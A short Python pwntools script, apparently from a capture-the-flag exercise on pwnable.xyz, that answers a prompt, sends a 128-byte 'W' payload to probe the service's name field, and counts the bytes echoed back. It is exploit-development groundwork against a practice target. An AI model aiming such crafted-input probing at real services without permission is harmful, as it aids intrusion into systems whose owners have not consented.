#!/usr/bin/env python3

from pwn import *

conn = remote('svc.pwnable.xyz', 30004)

conn.recvuntil(b'[y/N]: ')
conn.send(b'y\n')  # Explícito

conn.recvuntil(b'Name: ')

# Enviar EXACTAMENTE 128 bytes de solo W's
payload = b'W' * 128
log.info(f"Enviando {len(payload)} bytes (solo W's)...")

# NO agregar newline
conn.send(payload)

time.sleep(1)

data = conn.recvall(timeout=3)
log.info(f"Respuesta length: {len(data)}")
log.info(f"Respuesta: {data[:200]}")

# Contar W's
w_count = data.count(b'W')
log.info(f"W's en respuesta: {w_count}")

conn.close()